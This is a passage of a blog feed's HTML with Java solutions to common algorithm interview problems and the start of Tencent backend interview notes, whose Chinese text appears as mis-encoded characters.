class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">       <span class="type">int</span> res=Integer.MIN_VALUE,cur=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">           cur=Math.max(cur+nums[i],nums[i]);</span><br><span class="line">           res=Math.max(cur,res);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="regular-expression-matching">Regular Expression Matching âˆš</span></h2><p>Given an input string (<code>s</code>) and a pattern (<code>p</code>), implement regular expression matching with support for <code>&#39;.&#39;</code> and <code>&#39;*&#39;</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;.&#x27; Matches any single character.</span><br><span class="line">&#x27;*&#x27; Matches zero or more of the preceding element.</span><br></pre></td></tr></table></figure><p>The matching should cover the <strong>entire</strong> input string (not partial).</p><p><strong>Note:</strong></p><ul><li><code>s</code> could be empty and contains only lowercase letters <code>a-z</code>.</li><li><code>p</code> could be empty and contains only lowercase letters <code>a-z</code>, and characters like <code>.</code> or <code>*</code>.</li></ul><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a&quot;</span><br><span class="line">Output: false</span><br><span class="line">Explanation: &quot;a&quot; does not match the entire string &quot;aa&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a*&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: &#x27;*&#x27; means zero or more of the preceding element, &#x27;a&#x27;. Therefore, by repeating &#x27;a&#x27; once, it becomes &quot;aa&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;ab&quot;</span><br><span class="line">p = &quot;.*&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: &quot;.*&quot; means &quot;zero or more (*) of any character (.)&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 4:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;aab&quot;</span><br><span class="line">p = &quot;c*a*b&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: c can be repeated 0 times, a can be repeated 1 time. Therefore, it matches &quot;aab&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 5:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;mississippi&quot;</span><br><span class="line">p = &quot;mis*is*p*.&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> m=s.length(),n=p.length();</span><br><span class="line">        <span class="type">boolean</span>[][] dp=<span class="keyword">new</span> <span class="title class_">boolean</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span> cs[]=s.toCharArray(), cp[]=p.toCharArray();</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cp[i-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)dp[<span class="number">0</span>][i]=dp[<span class="number">0</span>][i-<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(cs[i-<span class="number">1</span>]==cp[j-<span class="number">1</span>]||cp[j-<span class="number">1</span>]==<span class="string">&#x27;.&#x27;</span>) dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(cp[j-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(cp[j-<span class="number">2</span>]==cs[i-<span class="number">1</span>]||cp[j-<span class="number">2</span>]==<span class="string">&#x27;.&#x27;</span>) dp[i][j]|=dp[i-<span class="number">1</span>][j]||dp[i][j-<span class="number">1</span>]||dp[i][j-<span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">else</span> dp[i][j]=dp[i][j-<span class="number">2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="æ’åº">æ’åº</span></h1><h2><span id="kth-largest-element-in-an-array">Kth Largest Element in an Array âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findKthLargest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(k&lt;=<span class="number">0</span>||k&gt;nums.length) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        qs(nums,nums.length-k);</span><br><span class="line">        <span class="keyword">return</span> nums[nums.length-k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">qs</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> k)</span>&#123;</span><br><span class="line">        <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> select(a,lo,hi);</span><br><span class="line">            <span class="keyword">if</span>(k==mid) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(k&gt;mid) lo=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> hi=mid-<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=lo,j=hi,x=a[lo];</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x) j--;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x) i++;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[j]=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        a[i]=x;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="æ•°å­—">æ•°å­—</span></h1><h2><span id="reverse-integer">Reverse Integer âˆš</span></h2><p>Given a 32-bit signed integer, reverse digits of an integer.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 123</span><br><span class="line">Output: 321</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -123</span><br><span class="line">Output: -321</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 120</span><br><span class="line">Output: 21</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">prevRev</span> <span class="operator">=</span> <span class="number">0</span> , rev= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x != <span class="number">0</span>)&#123;</span><br><span class="line">            rev= rev*<span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>((rev - x % <span class="number">10</span>) / <span class="number">10</span> != prevRev)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            prevRev = rev;</span><br><span class="line">            x= x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="implement-rand10-using-rand7">Implement Rand10() Using Rand7()</span></h2><p>Given a function <code>rand7</code> which generates a uniform random integer in the range 1 to 7, write a function <code>rand10</code> which generates a uniform random integer in the range 1 to 10.</p><p>Do NOT use systemâ€™s <code>Math.random()</code>.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1</span><br><span class="line">Output: [7]</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2</span><br><span class="line">Output: [8,4]</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: [8,1,10]</span><br></pre></td></tr></table></figure><p>Idea: <code>rand7()</code> -&gt; <code>rand49()</code> -&gt; <code>rand40()</code> -&gt; <code>rand10()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rand10</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">40</span>;</span><br><span class="line">    <span class="keyword">while</span> (result &gt;= <span class="number">40</span>) &#123;result = <span class="number">7</span> * (rand7() - <span class="number">1</span>) + (rand7() - <span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> result % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Summary:<br>I assume <code>rand7()</code> represents the number from <code>0</code> to <code>6</code> which is more general in Java, please refer <code>Random</code> class and <code>nextInt(int bound)</code>: <a href="https://docs.oracle.com/javase/8/docs/api/java/util/Random.html#nextInt-int-">knock API door</a></p><ol><li>Key is <code>uniform</code></li><li><code>rand7() * rand7()</code>, <code>rand7() + rand7()</code> are not uniform because some numbers can be generated by different combinations</li><li><code>rand7() + rand7() != rand7() * 2</code> because <code>rand7() + rand7()</code> is not uniform, whereas <code>rand7() * 2</code> is uniform</li><li><code>rand7()*c</code> is uniform where <code>c</code> stands for constant integers. (But note: uniform here is meant by <strong>discrete numbers</strong>, to make the range continuously, we need to fill the gap by adding <code>randc()</code> &#x3D;&gt; which then leads to OP solution)</li></ol><p>So pattern we can conclude: <code>k * randk + randk</code> is uniform.(Note for the 3rd rule, donâ€™t mix it up with <code>(k + 1)*randk</code>)</p><p><strong>å…¶å®å°±æ˜¯k^n(randk-1)+k^n-1(randk-1)+â€¦+randk-1å¤§äºrandMå°±è¡Œäº†</strong></p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2020/04/14/Tencent/"/>
      <url>/2020/04/14/Tencent/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>è…¾è®¯åå°é¢ç»</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%AE%97%E6%B3%95%E9%A2%98">ç®—æ³•é¢˜</a><ul><li><a href="#%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95">å‹ç¼©ç®—æ³•</a></li><li><a href="#%E6%AF%8Fk%E4%B8%AA%E8%8A%82%E7%82%B9%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8-">æ¯Kä¸ªèŠ‚ç‚¹ç¿»è½¬é“¾è¡¨ -</a></li><li><a href="#%E6%9C%80%E9%95%BF%E4%B8%8D%E9%87%8D%E5%A4%8D%E5%AD%90%E4%B8%B2-">æœ€é•¿ä¸é‡å¤å­ä¸² -</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">æ•°æ®åº“</a><ul><li><a href="#mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84%E6%96%B9%E5%BC%8F">mysqlä¸»ä»å¤åˆ¶çš„æ–¹å¼</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%B8%E8%A7%81%E6%AD%BB%E9%94%81%E5%8E%9F%E5%9B%A0%E5%8F%8A%E5%A4%84%E7%90%86">æ•°æ®åº“å¸¸è§æ­»é”åŸå› åŠå¤„ç†</a></li></ul></li><li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">æ“ä½œç³»ç»Ÿ</a><ul><li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84fork%E6%93%8D%E4%BD%9C%E5%B8%A6%E6%9D%A5%E7%9A%84%E8%BF%9B%E7%A8%8B%E9%97%AE%E9%A2%98%E9%80%9A%E4%BF%A1%E9%97%AE%E9%A2%98">æ“ä½œç³»ç»Ÿçš„forkæ“ä½œï¼Œå¸¦æ¥çš„è¿›ç¨‹é—®é¢˜ï¼Œé€šä¿¡é—®é¢˜</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E7%94%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E7%94%A8%E5%A4%9A%E8%BF%9B%E7%A8%8B">ä»€ä¹ˆæ—¶å€™ç”¨å¤šçº¿ç¨‹ï¼Œä»€ä¹ˆæ—¶å€™ç”¨å¤šè¿›ç¨‹ âˆš</a></li><li><a href="#%E7%BA%BF%E7%A8%8B%E5%88%87%E6%8D%A2%E5%92%8C%E8%BF%9B%E7%A8%8B%E5%88%87%E6%8D%A2%E7%9A%84%E6%AF%94%E8%BE%83">çº¿ç¨‹åˆ‡æ¢å’Œè¿›ç¨‹åˆ‡æ¢çš„æ¯”è¾ƒ</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%88%87%E6%8D%A2%E5%BE%88%E6%85%A2">ä¸ºä»€ä¹ˆè™šæ‹Ÿåœ°å€åˆ‡æ¢å¾ˆæ…¢ï¼Ÿ</a></li><li><a href="#%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B">å­¤å„¿è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹ âˆš</a></li><li><a href="#%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E6%96%B9%E6%B3%95%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8D">è¿›ç¨‹è°ƒåº¦æ–¹æ³•è¯¦ç»†ä»‹ç» âˆš</a></li><li><a href="#%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E6%96%B9%E6%B3%95%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8D">é¡µé¢ç½®æ¢æ–¹æ³•è¯¦ç»†ä»‹ç» âˆš</a></li><li><a href="#%E6%AD%BB%E9%94%81">æ­»é”</a></li></ul></li><li><a href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C">è®¡ç®—æœºç½‘ç»œ</a><ul><li><a href="#tcpip%E4%B8%AD%E7%9A%84%E6%94%BB%E5%87%BB">TCP&#x2F;IPä¸­çš„æ”»å‡»</a></li><li><a href="#http10%E5%92%8Chttp11%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB">Http1.0å’ŒHttp1.1çš„ä¸»è¦åŒºåˆ« âˆš</a></li><li><a href="#http11%E4%B8%8Ehttp-20%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB-">http1.1ä¸http 2.0çš„ä¸»è¦åŒºåˆ« -</a></li><li><a href="#rtt%E5%92%8Crto">RTTå’ŒRTO âˆš</a></li><li><a href="#%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6">æ‹¥å¡æ§åˆ¶</a></li><li><a href="#%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6">æµé‡æ§åˆ¶</a></li><li><a href="#tcp%E5%A6%82%E4%BD%95%E6%8F%90%E4%BE%9B%E5%8F%AF%E9%9D%A0%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93">TCPå¦‚ä½•æä¾›å¯é æ•°æ®ä¼ è¾“</a></li><li><a href="#%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%86%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6%E5%92%8C%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6">å¦‚ä½•åŒºåˆ†æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶ï¼Ÿ</a></li><li><a href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-1">æ“ä½œç³»ç»Ÿ</a></li><li><a href="#select-epoll-poll">select epoll poll</a></li><li><a href="#http-keep-alive%E4%B8%8Etcp-keep-alive">http keep-aliveä¸tcp keep-alive</a></li><li><a href="#redis%E5%AE%9E%E4%B9%A0%E7%BC%93%E5%AD%98%E5%90%8C%E6%AD%A5">Rediså®ä¹ ç¼“å­˜åŒæ­¥</a></li></ul></li><li><a href="#%E5%AE%9E%E9%99%85%E9%97%AE%E9%A2%98">å®é™…é—®é¢˜</a><ul><li><a href="#%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3bug%E9%97%AE%E9%A2%98%E6%9C%89%E7%94%A8%E6%97%A5%E5%BF%97%E5%90%97">æ€ä¹ˆè§£å†³bugé—®é¢˜ï¼Œæœ‰ç”¨æ—¥å¿—å—ï¼Ÿ</a></li></ul></li><li><a href="#%E5%85%B6%E4%BB%96">å…¶ä»–</a><ul><li><a href="#%E5%93%88%E5%B8%8C%E5%86%B2%E7%AA%81%E6%B3%95">å“ˆå¸Œå†²çªæ³•</a></li></ul></li></ul><!-- tocstop --><h1><span id="ç®—æ³•é¢˜">ç®—æ³•é¢˜</span></h1><h2><span id="å‹ç¼©ç®—æ³•">å‹ç¼©ç®—æ³•</span></h2><p>å°Qæƒ³è¦ç»™ä»–çš„æœ‹å‹å‘é€ä¸€ä¸ªç¥ç§˜å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä»–å‘ç°å­—ç¬¦ä¸²çš„è¿‡äºé•¿äº†ï¼Œäºæ˜¯å°Qå‘æ˜äº†ä¸€ç§å‹ç¼©ç®—æ³•å¯¹å­—ç¬¦ä¸²ä¸­é‡å¤çš„éƒ¨åˆ†è¿›è¡Œäº†å‹ç¼©ï¼Œå¯¹äºå­—ç¬¦ä¸²ä¸­è¿ç»­çš„mä¸ªç›¸åŒå­—ç¬¦ä¸²Så°†ä¼šå‹ç¼©ä¸º<a href="m%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%95%B4%E6%95%B0%E4%B8%941%3C=m%3C=100">m|S</a>ï¼Œä¾‹å¦‚å­—ç¬¦ä¸²ABCABCABCå°†ä¼šè¢«å‹ç¼©ä¸º[3|ABC]ï¼Œç°åœ¨å°Qçš„åŒå­¦æ”¶åˆ°äº†å°Qå‘é€è¿‡æ¥çš„å­—ç¬¦ä¸²ï¼Œä½ èƒ½å¸®åŠ©ä»–è¿›è¡Œè§£å‹ç¼©ä¹ˆï¼Ÿ </p><p> <strong>è¾“å…¥æè¿°:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ç¬¬ä¸€è¡ŒåŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œä»£è¡¨å‹ç¼©åçš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">Sçš„é•¿åº¦&lt;=1000;</span><br><span class="line">Sä»…åŒ…å«å¤§å†™å­—æ¯ã€[ã€]ã€|;</span><br><span class="line">è§£å‹åçš„å­—ç¬¦ä¸²é•¿åº¦ä¸è¶…è¿‡100000;</span><br><span class="line">å‹ç¼©é€’å½’å±‚æ•°ä¸è¶…è¿‡10å±‚;</span><br></pre></td></tr></table></figure><p>è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HG[3|B[2|CA]]F</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HGBCACABCACABCACAF</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(String a)</span>&#123;</span><br><span class="line">        <span class="type">char</span>[] c = a.toCharArray();</span><br><span class="line">        Stack&lt;String&gt; rec =<span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        Stack&lt;Integer&gt; mul=<span class="keyword">new</span> <span class="title class_">Stack</span>();</span><br><span class="line">        <span class="type">int</span> multi=<span class="number">0</span>;        </span><br><span class="line">        StringBuilder tmp= <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;c.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c[i]==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                rec.push(tmp.toString());</span><br><span class="line">                tmp=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i]==<span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">int</span> loop=mul.pop();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;loop;j++)&#123;</span><br><span class="line">                    temp.append(tmp);</span><br><span class="line">                &#125;</span><br><span class="line">                tmp=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(rec.pop()+temp);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i]==<span class="string">&#x27;|&#x27;</span>)&#123;</span><br><span class="line">                mul.push(multi);</span><br><span class="line">                multi=<span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c[i]&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;c[i]&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">                multi=multi*<span class="number">10</span>+c[i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                tmp.append(c[i]+<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> sc.next();</span><br><span class="line">        sc.close();        </span><br><span class="line">        System.out.println(decode(a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="æ¯kä¸ªèŠ‚ç‚¹ç¿»è½¬é“¾è¡¨-">æ¯Kä¸ªèŠ‚ç‚¹ç¿»è½¬é“¾è¡¨ -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 